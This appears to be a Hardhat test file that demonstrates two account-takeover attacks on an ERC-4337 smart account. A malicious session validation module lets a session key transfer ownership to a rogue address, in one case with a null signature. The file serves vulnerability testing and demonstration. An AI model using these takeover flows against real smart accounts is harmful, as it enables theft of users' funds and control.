import { expect } from "chai";
import {
  makeEcdsaSessionKeySignedUserOp,
  enableNewTreeForSmartAccountViaEcdsa,
  getERC20SessionKeyParams,
  makeEcdsaSessionKeySignedUserOp_noSignature
} from "../../utils/sessionKey";
import { ethers, deployments, waffle } from "hardhat";
import { makeEcdsaModuleUserOp } from "../../utils/userOp";
import { encodeTransfer } from "../../utils/testUtils";
import {
  getEntryPoint,
  getSmartAccountImplementation,
  getSmartAccountFactory,
  getMockToken,
  getEcdsaOwnershipRegistryModule,
  getSmartAccountWithModule,
  getVerifyingPaymaster,
} from "../../utils/setupHelper";
import { BigNumber } from "ethers";
import { UserOperation } from "../../utils/userOperation";

describe("SessionKey - Attacks : Malicious Session Validation Module", async () => {

  const [deployer, smartAccountOwner, alice, bob, charlie, verifiedSigner, refundReceiver, sessionKey, nonAuthSessionKey , rogueOwner] = waffle.provider.getWallets();
  const maxAmount = ethers.utils.parseEther("100");

  const setupTests = deployments.createFixture(async ({ deployments, getNamedAccounts }) => {

    await deployments.fixture();
    const mockToken = await getMockToken();
    const entryPoint = await getEntryPoint();
    const ecdsaModule = await getEcdsaOwnershipRegistryModule();
    const EcdsaOwnershipRegistryModule = await ethers.getContractFactory("EcdsaOwnershipRegistryModule");
    let ecdsaOwnershipSetupData = EcdsaOwnershipRegistryModule.interface.encodeFunctionData(
        "initForSmartAccount",
        [await smartAccountOwner.getAddress()]
    );
    const smartAccountDeploymentIndex = 0;
    const userSA = await getSmartAccountWithModule(ecdsaModule.address, ecdsaOwnershipSetupData, smartAccountDeploymentIndex);

    // send funds to userSA and mint tokens
    await deployer.sendTransaction({
      to: userSA.address,
      value: ethers.utils.parseEther("10"),
    });
    await mockToken.mint(userSA.address, ethers.utils.parseEther("1000000"));

    //deploy forward flow module and enable it in the smart account
    const sessionKeyManager = await (await ethers.getContractFactory("SessionKeyManager")).deploy();
    let userOp = await makeEcdsaModuleUserOp(
        "enableModule",
        [sessionKeyManager.address],
        userSA.address,
        smartAccountOwner,
        entryPoint,
        ecdsaModule.address
    );
    await entryPoint.handleOps([userOp], alice.address);

    const AttackSessionModule = await (await ethers.getContractFactory("AttackSessionValidationModule")).connect(rogueOwner).deploy();

    const {sessionKeyData, leafData} = await getERC20SessionKeyParams(
        sessionKey.address,
        mockToken.address,
        charlie.address,
        maxAmount,
        0,
        0,
        AttackSessionModule.address
    );

    const merkleTree = await enableNewTreeForSmartAccountViaEcdsa(
        [ethers.utils.keccak256(leafData)],
        sessionKeyManager,
        userSA.address,
        smartAccountOwner,
        entryPoint,
        ecdsaModule.address
    );

    return {
      entryPoint: entryPoint,
      smartAccountImplementation: await getSmartAccountImplementation(),
      smartAccountFactory: await getSmartAccountFactory(),
      ecdsaModule: ecdsaModule,
      userSA: userSA,
      mockToken: mockToken,
      verifyingPaymaster: await getVerifyingPaymaster(deployer, verifiedSigner),
      sessionKeyManager: sessionKeyManager,
      AttackSessionModule: AttackSessionModule,
      sessionKeyData: sessionKeyData,
      leafData: leafData,
      merkleTree: merkleTree,
    };
  });

  const makeErc20TransferUserOp = async function (
      token: string,
      amount: BigNumber,
      recipient: string,
      txnValue: BigNumber,
      testParams: any = {}
  ) : Promise<UserOperation> {
    const transferUserOp = await makeEcdsaSessionKeySignedUserOp(
        "executeCall",
        [
          token,
          txnValue,
          encodeTransfer(recipient, amount.toString()),
        ],
        testParams.userSA.address,
        sessionKey,
        testParams.entryPoint,
        testParams.sessionKeyManager.address,
        0, 0,
        testParams.AttackSessionModule.address,
        testParams.sessionKeyData,
        testParams.merkleTree.getHexProof(ethers.utils.keccak256(testParams.leafData)),
    );
    return transferUserOp;
  }


  describe("SessionKey - Attacks : Malicious Session Validation Module - Attack Mode 1 - Un-restricted use of account by session keys ", async () => {

    it("Setting Attack Mode 1 - Changing ownership with dishonest session validation module ", async () => {
      const {
        entryPoint,
        userSA,
        sessionKeyManager,
        AttackSessionModule,
        sessionKeyData,
        leafData,
        merkleTree,
        mockToken,
        ecdsaModule
      } = await setupTests();

      //
      await AttackSessionModule.connect(rogueOwner).setCase("1");

      const transferUserOp = await makeEcdsaSessionKeySignedUserOp(
          "executeCall",
          [
            ecdsaModule.address,
            ethers.utils.parseEther("0"),
            ecdsaModule.interface.encodeFunctionData("transferOwnership", [rogueOwner.address]),
          ],
          userSA.address,
          sessionKey,
          entryPoint,
          sessionKeyManager.address,
          0,
          0,
          AttackSessionModule.address,
          sessionKeyData,
          merkleTree.getHexProof(ethers.utils.keccak256(leafData)),
      );

      console.log(await ecdsaModule.getOwner(userSA.address),"- Owner Account of Account pre takeover" )
      await entryPoint.handleOps([transferUserOp], alice.address, {gasLimit: 10000000});
      console.log(await ecdsaModule.getOwner(userSA.address),"- Owner Account of Account post takeover" )
      expect((await ecdsaModule.getOwner(userSA.address))).to.equal(rogueOwner.address);

    });

    it("Setting Attack Mode 2 - Accessing Account without Authentication / Signature", async () => {
      const {
        entryPoint,
        userSA,
        sessionKeyManager,
        AttackSessionModule,
        sessionKeyData,
        leafData,
        merkleTree,
        mockToken,
        ecdsaModule
      } = await setupTests();

      //
      await AttackSessionModule.connect(rogueOwner).setCase("2");

      const transferUserOp = await makeEcdsaSessionKeySignedUserOp_noSignature(
          "executeCall",
          [
            ecdsaModule.address,
            ethers.utils.parseEther("0"),
            ecdsaModule.interface.encodeFunctionData("transferOwnership", [deployer.address]),
          ],
          userSA.address,
          sessionKey,
          entryPoint,
          sessionKeyManager.address,
          0,
          0,
          AttackSessionModule.address,
          sessionKeyData,
          merkleTree.getHexProof(ethers.utils.keccak256(leafData)),
      );

      const transferUserOp1 = await makeEcdsaSessionKeySignedUserOp(
          "executeCall",
          [
            ecdsaModule.address,
            ethers.utils.parseEther("0"),
            ecdsaModule.interface.encodeFunctionData("transferOwnership", [deployer.address]),
          ],
          userSA.address,
          sessionKey,
          entryPoint,
          sessionKeyManager.address,
          0,
          0,
          AttackSessionModule.address,
          sessionKeyData,
          merkleTree.getHexProof(ethers.utils.keccak256(leafData)),
      );

      console.log(transferUserOp.signature,"- UserOp With Null Signature" )
      console.log(transferUserOp1.signature,"- UserOp with Valid Signature" )

      console.log(await ecdsaModule.getOwner(userSA.address),"- Owner Account of Account pre takeover" )
      await entryPoint.handleOps([transferUserOp], alice.address, {gasLimit: 10000000});
      console.log(await ecdsaModule.getOwner(userSA.address),"- Owner Account of Account post takeover" )
      expect((await ecdsaModule.getOwner(userSA.address))).to.equal(deployer.address);

    });

  });

});

//7984970061